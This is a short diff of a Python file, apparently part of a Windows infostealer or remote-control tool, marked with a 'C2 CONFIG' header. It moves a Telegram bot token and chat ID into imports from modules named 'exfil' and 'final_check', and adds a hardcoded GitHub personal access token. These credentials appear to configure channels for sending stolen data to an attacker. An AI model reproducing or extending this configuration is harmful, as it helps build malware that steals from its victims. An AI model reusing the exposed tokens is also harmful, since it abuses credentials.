@@ -1,3 +1,6 @@
+from exfil import CHAT_ID
+# pyrefly: ignore [missing-import]
+from repo.final_check import TG_TOKEN
 import os
 import sys
 import platform
@@ -9,8 +12,7 @@ import winreg
 from urllib.request import urlopen
 
 # === C2 CONFIG ===
-TG_TOKEN = "8342248445:AAEPSKK-ftF88_Gfdm73LWvYwDgDMP-14Tk"
-CHAT_ID = "7873230435"
+GH_TOKEN = "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"
 # ================
 
 def get_ip():
